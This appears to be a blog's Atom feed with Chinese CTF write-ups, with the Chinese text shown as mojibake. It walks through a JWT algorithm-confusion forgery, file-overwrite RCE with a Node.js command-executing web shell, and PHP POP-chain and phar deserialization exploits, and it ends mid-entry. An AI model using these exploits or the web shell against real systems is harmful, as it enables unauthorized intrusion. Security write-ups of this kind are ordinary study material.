<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://boooook123.github.io/Artone.github.io/</id>
    <title>Artone &apos;s Blog</title>
    <updated>2022-11-14T06:59:19.296Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://boooook123.github.io/Artone.github.io/"/>
    <link rel="self" href="https://boooook123.github.io/Artone.github.io/atom.xml"/>
    <subtitle>ä¸€äº›ç»†ç»†çš„çäº‹ã€‚ã€‚</subtitle>
    <logo>https://boooook123.github.io/Artone.github.io/images/avatar.png</logo>
    <icon>https://boooook123.github.io/Artone.github.io/favicon.ico</icon>
    <rights>All rights reserved 2022, Artone &apos;s Blog</rights>
    <entry>
        <title type="html"><![CDATA[â€œåä¸ºæ¯â€ç¬¬ä¸€å±Šä¸­å›½ç ”ç©¶ç”Ÿç½‘ç»œå®‰å…¨åˆ›æ–°å¤§èµ›web]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/hua-wei-bei-di-yi-jie-zhong-guo-yan-jiu-sheng-wang-luo-an-quan-chuang-xin-da-sai-web/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/hua-wei-bei-di-yi-jie-zhong-guo-yan-jiu-sheng-wang-luo-an-quan-chuang-xin-da-sai-web/">
        </link>
        <updated>2022-11-14T03:42:46.000Z</updated>
        <summary type="html"><![CDATA[<p>ç ”ç©¶ç”Ÿèµ›ï¼Œä½œä¸ºæœ¬ç§‘ç”Ÿå°±æ˜¯è¿‡æ¥å‡‘ä¸ªæ•°ã€‚ã€‚ã€‚</p>
]]></summary>
        <content type="html"><![CDATA[<p>ç ”ç©¶ç”Ÿèµ›ï¼Œä½œä¸ºæœ¬ç§‘ç”Ÿå°±æ˜¯è¿‡æ¥å‡‘ä¸ªæ•°ã€‚ã€‚ã€‚</p>
<!-- more -->
<h1 id="hackthisbox">HackThisBox</h1>
<p>æä¾›äº†æ•´ä¸ªdockeræºç ï¼Œ</p>
<p>åœ¨appä¸­è®¾ç½®äº†apiè·¯å¾„</p>
<pre><code>app.use('/', indexRouter);
app.use('/api', apiRouter);

</code></pre>
<p>apiä¸‹æœ‰ä¸¤ä¸ªè·¯ç”±ï¼Œä¸€ä¸ªæ˜¯login</p>
<pre><code class="language-javascript">router.post('/login', function(req, res, next) { //loginè·¯ç”±   å¯æ§ä¼ å‚username
  const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: &quot;RS256&quot; });
  res.send({
    status:200,
    msg:&quot;success&quot;,
    token
  })
})
</code></pre>
<p>æœ‰ä¸€ä¸ªjwtè®¤è¯ï¼Œé‡‡ç”¨çš„æ˜¯RS256çš„éå¯¹ç§°åŠ å¯†</p>
<p>å†çœ‹uploadè·¯ç”±</p>
<pre><code class="language-javascript">router.post('/upload', function(req, res, next) {
  if(req.files.length !== 0) {
    var savePath = '';
    if(req.auth.isAdmin === false) {
      var dirName = `./public/upload/${req.auth.home}/`  //admin
      fs.mkdir(dirName, (err)=&gt;{   //æ–°å»ºä¸€ä¸ªç›®å½•
        if(err) {
          console.log('error')
        } else {
          console.log('ok')
        }
      });
      savePath = path.join(dirName, req.files[0].originalname);  //è·¯å¾„æ‹¼æ¥åç¼€å 
    } else if(req.auth.isAdmin === true) {
      savePath = req.auth.home;  //å¯æ§è·¯å¾„  ./views/index.twig
    }

      fs.readFile(req.files[0].path, function(err, data) {   //
        if(err) {
          return res.status(500).send(&quot;error&quot;);
        } else {
          fs.writeFileSync(savePath, data);
        }
      });
    return res.status(200).send(&quot;file upload successfully&quot;);
  } else {
    return res.status(500).send(&quot;error&quot;);
  }
});
</code></pre>
<p>é€šè¿‡Authorizationè¯·æ±‚å¤´è·å–</p>
<h2 id="jwtç»•è¿‡">jwtç»•è¿‡</h2>
<p>https://www.freebuf.com/column/170359.html<br>
è¿™é‡Œæˆ‘ä»¬åˆ©ç”¨CVE-2016-5431 - å¯†é’¥æ··æ·†æ”»å‡»<br>
æ­¤æ”»å‡»çš„åŸå› æ˜¯æŸäº›åº“å¯¹ç­¾å/éªŒè¯HMACå¯¹ç§°åŠ å¯†çš„å¯†é’¥å’ŒåŒ…å«ç”¨äºéªŒè¯RSAç­¾åä»¤ç‰Œçš„å…¬é’¥çš„å¯†é’¥ä½¿ç”¨ç›¸åŒçš„å˜é‡åã€‚<br>
é€šè¿‡å°†ç®—æ³•è°ƒæ•´ä¸ºHMACå˜ä½“ï¼ˆHS256/HS384/HS512ï¼‰å¹¶ä½¿ç”¨å…¬å…±å¯ç”¨å…¬é’¥å¯¹å…¶è¿›è¡Œç­¾åï¼Œæˆ‘ä»¬å¯ä»¥æ¬ºéª—æœåŠ¡ä½¿ç”¨æœºå¯†å˜é‡ä¸­çš„ç¡¬ç¼–ç å…¬é’¥éªŒè¯HMACä»¤ç‰Œã€‚<br>
ç®€è€Œè¨€ä¹‹å°±æ˜¯å°†éå¯¹ç§°å¯†ç å˜æˆäº†å¯¹ç§°å¯†ç </p>
<pre><code class="language-javascript">
app.use(expressjwt({ secret: publicKey, algorithms: [&quot;HS256&quot;, &quot;RS256&quot;]}).unless({ path: [&quot;/&quot;, &quot;/api/login&quot;] }))

</code></pre>
<p>è¿™é‡Œå®ƒåŒæ—¶æ”¯æŒäº†HS256ä»¥åŠRS256ç®—æ³•ï¼Œå¹¶ä¸”éƒ½ä½¿ç”¨publicKeyä½œä¸ºå…¬é’¥ï¼Œå¦‚æœç°åœ¨æˆ‘ä»¬ä¼ªé€ JWTï¼Œä½¿å¾—headä¸º</p>
<pre><code>{&quot;alg&quot;: &quot;HS256&quot;, &quot;typ&quot;: &quot;JWT&quot;} 
</code></pre>
<p>é‚£ä¹ˆæœåŠ¡å™¨å°±ä¼šé¡ºå…¶è‡ªç„¶çš„å°†å®ƒä½œä¸ºHS256å»è§£ç ï¼Œç”±äºHS256æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæ‰€ä»¥åªè¦æœ‰å…¬é’¥å°±å¯ä»¥å®ç°ä¼ªé€ <br>
ä¼ªé€ adminåï¼Œæˆ‘ä»¬å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶å†™ï¼Œç”±äºè¿™é‡Œè¿˜å®‰è£…äº†nodemonè¿™ä¸ªæ‹“å±•ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦æ–‡ä»¶å‘ç”Ÿ<br>
æ›´æ”¹ï¼Œæ•´ä¸ªé¡¹ç›®å°±ä¼šè‡ªåŠ¨é‡è½½ï¼Œäºæ˜¯<br>
è€ƒè™‘æ–‡ä»¶è¦†ç›–index.jsæ¥å®ç°RCE</p>
<p>ä½†æ˜¯åœ¨app.jsè®¾ç½®äº†ä¸€ä¸ªé€šé˜²waf</p>
<p>ä½†æ˜¯è¿˜æ˜¯æœ‰ç»•è¿‡çš„å¯èƒ½ï¼Œå› ä¸ºä»»æ„æ–‡ä»¶å†™è°ƒç”¨çš„æ˜¯writeFileSync()ï¼Œè¿™ä¸ªå‡½æ•°å’ŒreadFileSync()å¯ä»¥è¯´æ˜¯æœ¬æ˜¯åŒæ ¹ç”Ÿï¼Œ</p>
<p>ä¹Ÿå°±æ˜¯è¯´å®ƒä¹Ÿå¯ä»¥é€šè¿‡ä¼ å…¥urlå¯¹è±¡ï¼Œæ˜¯æŒ‡å¯¹å…¶è¿›è¡Œurlè§£ç ï¼Œä»è€Œç»•è¿‡waf</p>
<p>ç”Ÿæˆä¸€ä¸ªurlå¯¹è±¡</p>
<pre><code class="language-javascript">const fs = require('fs');
data = &quot;123&quot;;
fs.writeFileSync(new URL('file:///E:/test.txt'),data);
console.log(new URL('file:///./rout%65s/index.%6as'));
</code></pre>
<p>è¾“å‡º</p>
<pre><code>URL {
  href: 'file:///rout%65s/index.%6as',
  origin: 'null',
  protocol: 'file:',
  username: '',
  password: '',
  host: '',
  hostname: '',
  port: '',
  pathname: '/rout%65s/index.%6as',
  search: '',
  searchParams: URLSearchParams {},
  hash: ''
}
</code></pre>
<p>æ‰‹åŠ¨è½¬åŒ–ä¸ºjsonï¼Œæ”¾åœ¨homeå­—æ®µ</p>
<p>exp</p>
<pre><code class="language-python">import jwt

public = open('public.pem', 'r').read()
header = {
  &quot;typ&quot;: &quot;JWT&quot;,
  &quot;alg&quot;: &quot;HS256&quot;
}
payload = {
  &quot;username&quot;: &quot;./index.php&quot;,
  &quot;isAdmin&quot;: True,
    &quot;home&quot;:{&quot;href&quot;: 'file://./rout%65s/ind%65x.%6as',&quot;origin&quot;: 'null',&quot;protocol&quot;: 'file:',&quot;username&quot;: '',&quot;password&quot;: '',&quot;host&quot;: '',&quot;hostname&quot;: '',&quot;port&quot;: '',&quot;pathname&quot;: './rout%65s/ind%65x.%6as',&quot;search&quot;: '',&quot;searchParams&quot;: &quot;URLSearchParams {}&quot;,&quot;hash&quot;: ''},
   &quot;iat&quot;: 1668309016
}
encoded = jwt.encode(payload, public, algorithm='HS256', headers=header)

print(encoded)
</code></pre>
<p>ç„¶åå†å†™ä¸€ä¸ªindex.jsï¼Œä¼ è¿›å»è¦†ç›–åŸæ¥çš„index.jsï¼Œåˆ©ç”¨æ¨¡æ¿è¯»å–flag</p>
<pre><code class="language-javascript">var express = require('express');
var router = express.Router();

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: require(&quot;child_process&quot;).execSync(&quot;/readflag&quot;).toString() }); 
});

module.exports = router;
</code></pre>
<p>æˆ–è€…ç›´æ¥è¦†ç›–æ‰index.jsç„¶åå†™ä¸ªshell</p>
<pre><code class="language-javascript">var express = require('express');
var router = express.Router();

var exec = require('child_process').exec;
/* GET home page. */
router.post('/', function(req, res, next) {
    exec(req.body.cmd, function(error, stdout, stderr) {
        if(error){
            console.error(error);
        }
        else{
            console.log(&quot;success&quot;);
        }
        return res.send(stdout);
    });

});

module.exports = router;
</code></pre>
<p>ä¸€å¥è¯ç‰ˆ</p>
<pre><code class="language-javascript">var express = require('express');
var router = express.Router();

/* GET home page. */
router.post('/', function(req, res, next) {
    return res,send(require(&quot;child_process&quot;).exec(req.body.cmd).toString());

});

module.exports = router;
</code></pre>
<p>postç»™cmdä¼ å‚</p>
<pre><code>
</code></pre>
<h1 id="misc_bit_qr">misc_Bit_QR</h1>
<p>ä¸€ä¸ªç¼ºå°‘äº†å®šä½ç¬¦çš„äºŒç»´ç ï¼Œè¡¥å…¨å®šä½ç ç›´æ¥è§£ï¼Œ<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408973417.png" alt="" loading="lazy"></p>
<p>å¾—åˆ°457c</p>
<p>ç”¨010æ‰“å¼€å›¾ç‰‡ï¼Œå‘ç°IENDåé¢è¿˜æœ‰å†…å®¹ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªç¼ºäº†éƒ¨åˆ†æ–‡ä»¶å¤´çš„pngå›¾ç‰‡ï¼Œæ‰‹åŠ¨æå–ä¸€ä¸‹<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408997207.png" alt="" loading="lazy"></p>
<p>å¾—åˆ°ä¸€å¼ æ–°çš„äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°åŠä¸ªflag</p>
<p>åœ¨åŸæ¥çš„é‚£å¼ äºŒç»´ç ä¸­è¿˜å‘ç°æœ‰ä¸€ä¸ªå¾ˆå°çš„idatå—ï¼Œzlibè§£å‹å‡ºæ¥å‘ç°æ˜¯ä¸€ä¸²16è¿›åˆ¶æ•°æ®</p>
<p>42064652d3431356135323533646230387d0ec187c229c4d4a44</p>
<p>ç›´æ¥è§£ç å¾—åˆ°ä¸€ä¸²ä¹±ç ï¼Œä»”ç»†è§‚å¯Ÿå‘ç°06è¿™ä¸ªå­—èŠ‚æœ‰é—®é¢˜ï¼Œå¦‚æœåˆ å»0ï¼Œè²Œä¼¼å¯ä»¥å¾—åˆ°ä¸€ä¸²å­—ç¬¦ä¸²<br>
<img src="https://boooook123.github.io/Artone.github.io//post-images/1668408986799.png" alt="" loading="lazy"></p>
<p>åˆæç¤ºäº†flagä¸­æ²¡æœ‰å¤§å†™å­—æ¯ï¼Œæ‰€ä»¥æŠŠç¬¬ä¸€ä¸ªå­—æ¯ä¹Ÿå»æ‰</p>
<p>å…¨éƒ¨æ‹¼æ¥èµ·æ¥å¾—åˆ°æœ€åçš„flag</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[GFCTF wp]]></title>
        <id>https://boooook123.github.io/Artone.github.io/post/gfctf-wp/</id>
        <link href="https://boooook123.github.io/Artone.github.io/post/gfctf-wp/">
        </link>
        <updated>2022-11-08T06:50:07.000Z</updated>
        <summary type="html"><![CDATA[<p>ç»å…¸æ‰“å¡å®‰æ’åæœˆæœˆèµ›ï¼Œä½†æ˜¯è¿™ä¸ªwpæ‹–æ›´æ•´æ•´ä¸€ä¸ªæœˆäº†ã€‚ã€‚ğŸ˜…</p>
]]></summary>
        <content type="html"><![CDATA[<p>ç»å…¸æ‰“å¡å®‰æ’åæœˆæœˆèµ›ï¼Œä½†æ˜¯è¿™ä¸ªwpæ‹–æ›´æ•´æ•´ä¸€ä¸ªæœˆäº†ã€‚ã€‚ğŸ˜…</p>
<!-- more -->
<h1 id="web">web</h1>
<h2 id="easypop">EasyPOP</h2>
<p>å…ˆçœ‹æºç </p>
<pre><code class="language-php"> &lt;?php
highlight_file(__FILE__);
error_reporting(0);

class fine
{
    private $cmd;
    private $content;

    public function __construct($cmd, $content)
    {
        $this-&gt;cmd = $cmd;
        $this-&gt;content = $content;
    }

    public function __invoke()
    {
        echo &quot;123&quot;;
        call_user_func($this-&gt;cmd, $this-&gt;content);
    }

    public function __wakeup()
    {
        $this-&gt;cmd = &quot;&quot;;
        die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);
    }
}

class show
{
    public $ctf;
    public $time = &quot;Two and a half years&quot;;

    public function __construct($ctf)
    {
        $this-&gt;ctf = $ctf;
    }


    public function __toString()
    {
        return $this-&gt;ctf-&gt;show();
    }

    public function show(): string
    {
        return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;
    }


}

class sorry
{
    private $name;
    private $password;
    public $hint = &quot;hint is depend on you&quot;;
    public $key;

    public function __construct($name, $password)
    {
        $this-&gt;name = $name;
        $this-&gt;password = $password;
    }

    public function __sleep()
    {
        $this-&gt;hint = new secret_code();
    }

    public function __get($name)
    {
        $name = $this-&gt;key;
        $name();
    }


    public function __destruct()
    {
        if ($this-&gt;password == $this-&gt;name) {

            echo $this-&gt;hint;
        } else if ($this-&gt;name = &quot;jay&quot;) {
            secret_code::secret();
        } else {
            echo &quot;This is our code&quot;;
        }
    }


    public function getPassword()
    {
        return $this-&gt;password;
    }

    public function setPassword($password): void
    {
        $this-&gt;password = $password;
    }


}

class secret_code
{
    protected $code;

    public static function secret()
    {
        include_once &quot;hint.php&quot;;
        hint();
    }

    public function __call($name, $arguments)
    {
        $num = $name;
        $this-&gt;$num();
    }

    private function show()
    {
        return $this-&gt;code-&gt;secret;
    }
}


if (isset($_GET['pop'])) {
    $a = unserialize($_GET['pop']);
    $a-&gt;setPassword(md5(mt_rand()));
} else {
    $a = new show(&quot;Ctfer&quot;);
    echo $a-&gt;show();
}
Go listen to Jay Chou's secret-code! Really nice123
</code></pre>
<p>popé“¾ï¼š</p>
<pre><code>sorry::destruct -&gt; show::toString -&gt; secret_code::call -&gt; sorry::get -&gt; fine::invoke
</code></pre>
<p>è¿™é‡Œæƒ³è¦è°ƒç”¨destructä¸­çš„hintå°±éœ€è¦æ»¡è¶³</p>
<pre><code>($this-&gt;password == $this-&gt;name)
</code></pre>
<p>è¿™é‡Œä»–è®¾ç½®äº†Passwordï¼Œä½†æ˜¯æ˜¯åœ¨ååºåˆ—åŒ–ä¹‹åï¼Œæ‰€ä»¥å¹¶æ²¡æœ‰ä»€ä¹ˆä½œç”¨ï¼Œç›´æ¥ä¼ ä¸¤ä¸ªå€¼ä½¿ä¹‹ç›¸ç­‰å³å¯</p>
<p>expï¼š</p>
<pre><code class="language-php">&lt;?php

class sorry
{
    private $name;
    private $password;
    public $hint;
    public $key;
    public function __construct($name,$password,$hint,$key)
    {
        $this-&gt;name = $name;
        $this-&gt;password = $password;
        $this-&gt;hint = $hint;
        $this-&gt;key = $key;
    }

}
class show
{
    public $ctf;
    public function __construct($ctf)
    {
        $this-&gt;ctf = $ctf;
    }
}
class secret_code
{
    protected $code;
    public function __construct($code)
    {
        $this-&gt;code = $code;
    }
}
class fine
{
    private $cmd;
    private $content;
    public function __construct($cmd, $content)
    {
        $this-&gt;cmd = $cmd;
        $this-&gt;content = $content;
    }

}
$f = new fine(&quot;system&quot;, &quot;cat /*&quot;);
$s1 = new sorry('','','',$f);
$s = new secret_code($s1);
$sh = new show($s);
$a = new sorry(&quot;jay&quot;, &quot;jay&quot;, $sh ,'');

$b = serialize($a);
$b1 = str_replace('&quot;fine&quot;:2', '&quot;fine&quot;:3', $b);
echo urlencode($b1);
# sorry::destruct -&gt; show::toString -&gt; secret_code::call -&gt; sorry::get -&gt; fine::invoke
</code></pre>
<h2 id="hade_waibo">hade_waibo</h2>
<h3 id="éé¢„æœŸ">éé¢„æœŸ</h3>
<p>æ²¡æœ‰åˆ start.sh,</p>
<p>ä»»æ„æ–‡ä»¶è¯»ç›´æ¥è¯»åˆ°start.sh,æ‰¾åˆ°flagçš„æ–‡ä»¶å</p>
<h3 id="é¢„æœŸè§£">é¢„æœŸè§£</h3>
<p>å…ˆç™»å…¥ï¼Œä¸è®¾æœ‰å¯†ç ï¼Œéšä¾¿è¾“ä¸€ä¸ªusernameå°±å¯ä»¥ç™»å…¥äº†</p>
<p>åœ¨é‡Œé¢å‘ç°ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç‚¹ï¼Œä»¥åŠä¸€ä¸ªæ–‡ä»¶è¯»å–ç‚¹ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä»»æ„æ–‡ä»¶è¯»</p>
<p>å¯ä»¥å…ˆæŠŠç›¸å…³çš„æºç éƒ½è¯»å‡ºæ¥</p>
<p>é‡ç‚¹åœ¨class.php</p>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
    public function __construct($username){  //ç”±å‰ç«¯çš„è¾“å…¥è§¦å‘
        $this-&gt;username = $username;
        $_SESSION['isLogin'] = True;
        $_SESSION['username'] = $username;
    }
    public function __wakeup(){
        $cklen = strlen($_SESSION[&quot;username&quot;]);
        if ($cklen != 0 and $cklen &lt;= 6) {
            $this-&gt;username = $_SESSION[&quot;username&quot;];
        }
    }
    public function __destruct(){
        if ($this-&gt;username == '') {  //è§¦å‘toString
            session_destroy();  //é”€æ¯å½“å‰ä¼šè¯ä¸­çš„æ•°æ®
        }
    }
}

class File
{
    #æ›´æ–°é»‘åå•ä¸ºç™½åå•ï¼Œæ›´åŠ çš„å®‰å…¨
    public $white = array(&quot;jpg&quot;,&quot;png&quot;);

    public function show($filename){  //å‰ç«¯å¯è§¦å‘
        echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\'file.php?m=show&amp;filename=\'+document.getElementById(\'filename\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;';
        if(empty($filename)){die();}
        return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;';  //å¯ä»¥è§¦å‘ååºåˆ—åŒ–
    }
    public function upload($type){  //å‰ç«¯å¯è§¦å‘
        $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;;
        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename);
        return &quot;Upload success! Path: upload/&quot; . $filename;
    }
    public function rmfile(){
        system('rm -rf /var/www/html/upload/*');
    }
    public function check($type){
        if (!in_array($type,$this-&gt;white)){
            return false;
        }
        return true;
    }

}

#æ›´æ–°äº†ä¸€ä¸ªæ¶æ„åˆæœ‰è¶£çš„Testç±»
class Test
{
    public $value;

    public function __destruct(){
        chdir('./upload');
        $this-&gt;backdoor();
    }
    public function __wakeup(){
        $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;;
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, &quot;Hack by $file !&quot;);
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){
            $this-&gt;value = 'nono~';
        }
        system($this-&gt;value);
    }

}
</code></pre>
<p>fileç±»ä¸­ä½¿ç”¨file_get_contentså‡½æ•°ï¼Œä»è€Œæä¾›äº†æ‰“pharååºåˆ—åŒ–çš„å¯èƒ½ï¼Œåˆä¸€ä¸ªsystemå¯ä»¥å‘½ä»¤æ‰§è¡Œï¼Œä½†æ˜¯åšäº†æ— æ•°å­—å’Œæ— å­—æ¯çš„è¿‡æ»¤ï¼Œéš¾ä»¥ç›´æ¥åˆ©ç”¨</p>
<p>è¿™é‡Œå¯ä»¥åˆ†ä¸¤æ­¥æ¥åˆ©ç”¨systemæ‰§è¡Œå‘½ä»¤</p>
<h4 id="ç¬¬ä¸€æ­¥">ç¬¬ä¸€æ­¥</h4>
<p>æ„é€ é“¾å­è§¦å‘toStringï¼Œæ¥å†™æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬å¯æ§çš„åªæœ‰æ–‡ä»¶åï¼Œä¸è¿‡è¿™å·²ç»å¤Ÿäº†ï¼Œå› ä¸ºé€šé…ç¬¦å¯ä»¥åŒ¹é…æ–‡ä»¶åï¼Œæ‰€ä»¥åªè¦æŠŠæ–‡ä»¶åè®¾ä¸ºcatï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨é€šé…ç¬¦*åœ¨å‘½ä»¤æ‰§è¡Œä¸­ä»£æ›¿catï¼Œä»è€Œç»•è¿‡preg_match</p>
<p>é“¾å­ï¼š</p>
<pre><code>User::destruct -&gt; Test::toString
</code></pre>
<p>ä¸ºäº†å½¢æˆè¿™ä¸ªé“¾å­ï¼Œæˆ‘ä»¬éœ€è¦è®©username=new Test() ï¼Œä½†æ˜¯__wakeup()ä¼šå…ˆäº__destruct()è§¦å‘ï¼Œè¦†ç›–æ‰usernameçš„å€¼</p>
<pre><code class="language-php">public function __wakeup(){
        $cklen = strlen($_SESSION[&quot;username&quot;]);
        if ($cklen != 0 and $cklen &lt;= 6) {
            $this-&gt;username = $_SESSION[&quot;username&quot;];
        }
    }
    public function __destruct(){
        if ($this-&gt;username == '') {  //è§¦å‘toString
            session_destroy();  //é”€æ¯å½“å‰ä¼šè¯ä¸­çš„æ•°æ®
        }
    }
</code></pre>
<p>ç”±äºç‰ˆæœ¬çš„åŸå› ï¼Œè¿™æ ·çš„wakeupä¸èƒ½æœ‰ä¹‹å‰çš„cveæ¥ç»•è¿‡ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½ä½¿å®ƒä¸æ»¡è¶³ifï¼Œä¹Ÿå°±æ˜¯è®©SESSION[&quot;username&quot;]çš„é•¿åº¦å¤§äº6ï¼Œåœ¨æœ€å¼€å§‹çš„ç™»å…¥ç•Œé¢ï¼Œå‰ç«¯é™åˆ¶äº†usernameçš„é•¿åº¦ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡bpç­‰æ‰‹æ®µå»ç»•è¿‡</p>
<p>expï¼š</p>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
    function __construct($username)
    {
        $this-&gt;username = $username;
    }
}
class Test
{
    public $value;
    function __construct($value)
    {
        $this-&gt;value = $value;
    }
    
}
@unlink(&quot;phar.phar&quot;);
@unlink(&quot;phar.jpg&quot;);
$Test = new Test(&quot;aa&quot;);
$User = new User($Test);

echo serialize($User);
$phar = new Phar(&quot;phar.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
$phar-&gt; addFromString('test.txt','h3en1');
$phar-&gt;setMetadata($User);
$phar-&gt;stopBuffering();
rename(&quot;phar.phar&quot;,&quot;phar.jpg&quot;);
</code></pre>
<p>uploadåï¼Œè§¦å‘pharååºåˆ—åŒ–</p>
<pre><code>GET /file.php?m=show&amp;filename=phar://./upload/dasctfb886ff1ed98265e607978e50ce7e72f4.jpg/test.txt&amp;file=cat HTTP/1.1
</code></pre>
<p>ç”Ÿæˆåå¯ä»¥å†è¯»ä¸€ä¸‹catæ–‡ä»¶ï¼Œç¡®ä¿å·²ç»ç”Ÿæˆ</p>
<h4 id="ç¬¬äºŒæ­¥">ç¬¬äºŒæ­¥</h4>
<p>åˆ©ç”¨é€šé…ç¬¦è¯»å‡ºæ‰€æœ‰æ–‡ä»¶ï¼Œsystemé‡Œåº”è¯¥æ‰§è¡Œçš„æ˜¯* /*</p>
<p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨backdooræ‰§è¡Œä¹‹å‰ï¼Œä¼šè§¦å‘wakeupï¼Œä¹Ÿå°±æ˜¯è¦†ç›–æ‰valueçš„å€¼ï¼Œè€Œä¸”è¿™é‡Œå¹¶ä¸åƒUseré‡Œçš„wakeupç»•è¿‡</p>
<pre><code class="language-php">public function __wakeup(){
        $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;;
    }
    public function __toString(){
        $file = substr($_GET['file'],0,3);
        file_put_contents($file, &quot;Hack by $file !&quot;);
        return 'Unreachable! :)';
    }
    public function backdoor(){
        if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){
            $this-&gt;value = 'nono~';
        }
        system($this-&gt;value);
    }
</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬åªèƒ½è€ƒè™‘å¦‚ä½•åœ¨valueè¢«è¦†ç›–åå†æ”¹å›æ¥ï¼Œè¿™é‡Œå°±æ¶‰åŠåˆ°äº†ååºåˆ—åŒ–çš„æ‰§è¡Œé¡ºåº</p>
<p>å¦‚æœæˆ‘çš„é“¾å­æ˜¯ä»Useræ‰“åˆ°Testï¼Œé‚£ä¹ˆä»–ä¼šå…ˆååºåˆ—åŒ–Testï¼Œç„¶åååºåˆ—åŒ–Userï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥è°ƒè¯•ä¸€ä¸‹çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆååºåˆ—åŒ–çš„</p>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
    public $a;
    public function __construct($a)
    {
        $this-&gt;a = $a;
    }
    public function __wakeup()
    {
        echo &quot;2&quot;;
    }
}
class Test
{
    public $value;
    function __construct($value)
    {
        $this-&gt;value = $value;
    }
    public function __wakeup()
    {
        echo &quot;1&quot;;
    }
}
$Test = new Test(&quot;aa&quot;);
$User = new User($Test); 
$User-&gt;username = &amp;$Test-&gt;value;
$ss = serialize($User);
unserialize($ss);

#12
</code></pre>
<p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡Useré‡Œçš„wakeupé‡æ–°ç»™usernameèµ‹å›æˆ‘ä»¬æƒ³è¦çš„å€¼</p>
<p>æƒ³è¦é€šè¿‡usernameç»™valueèµ‹å€¼ç»†åˆ†æ¥è¯´ä¹Ÿéœ€è¦ä¸¤æ­¥</p>
<h5 id="ç¬¬ä¸€æ­¥-2">ç¬¬ä¸€æ­¥</h5>
<p>æ³¨å†Œä¸€ä¸ªusername ä¸º* /*ï¼Œåˆå§‹åŒ–åä¼šæŠŠè¿™ä¸ªå€¼æ”¾åœ¨SESSION[&quot;username&quot;]ï¼Œä¹‹åè¿˜ä¼šèµ‹å€¼ç»™username</p>
<pre><code class="language-php">public function __wakeup(){
        $cklen = strlen($_SESSION[&quot;username&quot;]);
        if ($cklen != 0 and $cklen &lt;= 6) {
            $this-&gt;username = $_SESSION[&quot;username&quot;];
        }
    }
</code></pre>
<h5 id="ç¬¬äºŒæ­¥-2">ç¬¬äºŒæ­¥</h5>
<p>åœ¨æ„é€ é“¾å­çš„æ—¶å€™ä½¿username=&amp;Test-&gt;valueï¼Œä¹Ÿå°±æ˜¯è®©usernameå˜æˆæŒ‡å‘valueçš„æŒ‡é’ˆ</p>
<h4 id="final-exp">Final expï¼š</h4>
<pre><code class="language-php">&lt;?php
class User
{
    public $username;
}
class Test
{
    public $value;
}
@unlink(&quot;phar1.phar&quot;);
@unlink(&quot;phar1.jpg&quot;);
$User = new User();
$Test = new Test();
$User-&gt;a = $Test;  //è¿™é‡Œåªè¦é“¾ä¸Šå°±è¡Œ
$User-&gt;username = &amp;$Test-&gt;value;
echo serialize($User);
$phar = new Phar(&quot;phar1.phar&quot;);
$phar-&gt;startBuffering();
$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
$phar-&gt; addFromString('test.txt','h3en1');
$phar-&gt;setMetadata($User);
$phar-&gt;stopBuffering();
rename(&quot;phar1.phar&quot;,&quot;phar1.jpg&quot;);
</code></pre>
<pre><code>GET /file.php?m=show&amp;filename=phar://./upload/dasctfafee6033fe501630864dcaf25a98d1ee.jpg/test.txt
</code></pre>
<h2 id="easylove">EasyLove</h2>
<p>phpæºç </p>
<pre><code class="language-php">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
class swpu{
    public $wllm;
    public $arsenetang;
    public $l61q4cheng;
    public $love;
    
    public function __construct($wllm,$arsenetang,$l61q4cheng,$love){
        $this-&gt;wllm = $wllm;
        $this-&gt;arsenetang = $arsenetang;
